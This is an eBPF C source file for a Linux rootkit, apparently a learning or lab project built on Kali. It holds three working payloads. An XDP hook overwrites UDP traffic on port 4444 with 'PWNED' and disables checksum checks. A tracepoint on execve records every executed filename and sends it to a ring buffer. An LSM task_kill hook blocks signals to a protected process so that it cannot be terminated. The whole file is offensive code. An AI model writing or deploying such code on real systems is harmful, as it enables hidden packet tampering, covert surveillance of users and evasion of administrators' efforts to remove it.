#include "vmlinux.h"

// --- [ KALI PATCH: Type Compatibility ] ---
typedef unsigned long long __u64;
typedef unsigned int       __u32;
typedef unsigned short     __u16;
typedef unsigned char      __u8;
typedef int                __s32;
typedef long long          __s64;

typedef __u32 __wsum;
typedef __u32 __be32;
typedef __u16 __be16;
typedef __u64 __be64;

#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>

#define ETH_P_IP    0x0800
#define IPPROTO_UDP 17

// Helper to swap endianness (Host <-> Network)
#define bpf_htons(x) __builtin_bswap16(x)

// ---[ MAPS ]---
struct {
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, 256 * 1024);
} rb SEC(".maps");

struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __uint(max_entries, 1);
    __type(key, u32);
    __type(value, u32);
} pid_map SEC(".maps");


SEC("xdp")
int xdp_troll(struct xdp_md *ctx)
{
    void *data_end = (void *)(long)ctx->data_end;
    void *data     = (void *)(long)ctx->data;

    // 1. Parse Ethernet Header
    struct ethhdr *eth = data;
    if ((void*)(eth + 1) > data_end) return XDP_PASS;

    // 2. Parse IP Header (Check if it's IP)
    if (eth->h_proto != bpf_htons(ETH_P_IP)) return XDP_PASS;

    struct iphdr *ip = (void*)(eth + 1);
    if ((void*)(ip + 1) > data_end) return XDP_PASS;

    // 3. Parse UDP Header (Check if it's UDP)
    if (ip->protocol != IPPROTO_UDP) return XDP_PASS;

    struct udphdr *udp = (void*)(ip + 1);
    if ((void*)(udp + 1) > data_end) return XDP_PASS;

    // 4. Target Port 4444
    if (udp->dest != bpf_htons(4444)) return XDP_PASS;

    // 5. Point to the Payload (The text data)
    char *payload = (void*)(udp + 1);

    // Ensure we have at least 5 bytes of data to overwrite
    if ((void*)(payload + 5) > data_end) return XDP_PASS;

    // ---[ THE HACK ]---
    // Overwrite the first 5 bytes of the message
    payload[0] = 'P';
    payload[1] = 'W';
    payload[2] = 'N';
    payload[3] = 'E';
    payload[4] = 'D';

    // DISABLE CHECKSUM VALIDATION
    // If we change data, the original checksum is wrong, and the kernel would drop it.
    // In UDP, setting checksum to 0 tells the kernel "Don't bother checking."
    udp->check = 0;

    bpf_printk("ROOTKIT: Trolling packet on port 4444\n");

    return XDP_PASS;
}


// ---[ PAYLOAD 2: Tracepoint Spy ]---
struct event_t {
    u32 pid;
    char comm[80]; // Set larger size to hold more filenames/commands
};

SEC("tp/syscalls/sys_enter_execve")
int tp_execve(struct trace_event_raw_sys_enter *ctx)
{
    struct event_t *e;
    e = bpf_ringbuf_reserve(&rb, sizeof(*e), 0);
    if (!e) return 0;

    e->pid = bpf_get_current_pid_tgid() >> 32;

    /* FIX: For tracepoints (sys_enter), arguments are stored in the
     *      'args' array. args[0] is the first argument (the filename).
     */
    bpf_probe_read_user_str(e->comm, sizeof(e->comm), (void *)ctx->args[0]);

    bpf_ringbuf_submit(e, 0);
    return 0;
}


// ---[ PAYLOAD 3: Another Kill Blocker (Active Defense this time though!) ]---
// If override_return is disabled, we switch to bpf_send_signal.
// Instead of blocking the syscall, we KILL the process trying to kill us.

SEC("lsm/task_kill")
int BPF_PROG(restrict_kill, struct task_struct *p, struct kernel_siginfo *info, int sig, const struct cred *cred)
{
    pid_t target_pid = p->tgid;
    u32 key = 0;
    u32 *protected_pid;

    // Check if the process being killed (p) is our protected PID
    protected_pid = bpf_map_lookup_elem(&pid_map, &key);

    if (protected_pid && target_pid == *protected_pid) {
        bpf_printk("ROOTKIT: LSM Blocked signal %d to PID %d\n", sig, target_pid);

        // Return -EPERM (Operation not permitted)
        // This stops the signal from ever being sent!
        return -1;
    }

    return 0; // Allow everything else
}
char LICENSE[] SEC("license") = "GPL";